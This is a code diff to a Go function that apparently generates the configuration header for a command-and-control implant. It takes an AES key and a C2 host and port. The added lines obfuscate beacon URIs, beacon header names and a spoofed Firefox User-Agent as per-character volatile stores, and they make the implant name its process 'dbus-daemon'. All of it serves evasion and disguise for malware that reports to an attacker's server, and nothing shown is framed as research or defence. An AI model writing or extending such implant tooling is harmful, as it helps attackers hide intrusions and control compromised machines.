@@ -89,6 +89,28 @@ func generateNaxConfigH(aesKeyHex, c2Host string, c2Port int, extraHosts []strin
 		fmt.Fprintf(&buf, "#define NAX_CB_PORT_%d_WRITE( p ) do { volatile uint8_t *_pp=(volatile uint8_t*)(p); _pp[0]=0x%02X; _pp[1]=0x%02X; } while(0)\n", i, pLo, pHi)
 	}
 
+
+	buf.WriteString("\n/* Pre-profile URIs — per-char volatile stores */\n")
+	writeNaxCharWriteMacro(&buf, "NAX_URI_GET_WRITE", "/news/feed")
+	fmt.Fprintf(&buf, "#define NAX_URI_GET_LEN %du\n", len("/news/feed"))
+	writeNaxCharWriteMacro(&buf, "NAX_URI_POST_WRITE", "/api/submit")
+	fmt.Fprintf(&buf, "#define NAX_URI_POST_LEN %du\n", len("/api/submit"))
+
+	buf.WriteString("\n/* Pre-profile headers — per-char volatile stores */\n")
+	writeNaxCharWriteMacro(&buf, "NAX_BEACON_HDR_WRITE", "X-Beacon-Id")
+	fmt.Fprintf(&buf, "#define NAX_BEACON_HDR_LEN %du\n", len("X-Beacon-Id"))
+	writeNaxCharWriteMacro(&buf, "NAX_PUBLIC_HDR_WRITE", "X-NaX-Public")
+	fmt.Fprintf(&buf, "#define NAX_PUBLIC_HDR_LEN %du\n", len("X-NaX-Public"))
+
+	buf.WriteString("\n/* User-Agent — per-char volatile stores */\n")
+	ua := "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
+	writeNaxCharWriteMacro(&buf, "NAX_UA_WRITE", ua)
+	fmt.Fprintf(&buf, "#define NAX_UA_LEN %du\n", len(ua))
+
+	buf.WriteString("\n/* Process comm name — per-char volatile stores */\n")
+	writeNaxCharWriteMacro(&buf, "NAX_COMM_NAME_WRITE", "dbus-daemon")
+	fmt.Fprintf(&buf, "#define NAX_COMM_NAME_LEN %du\n", len("dbus-daemon"))
+
 	return buf.Bytes(), nil
 }
 
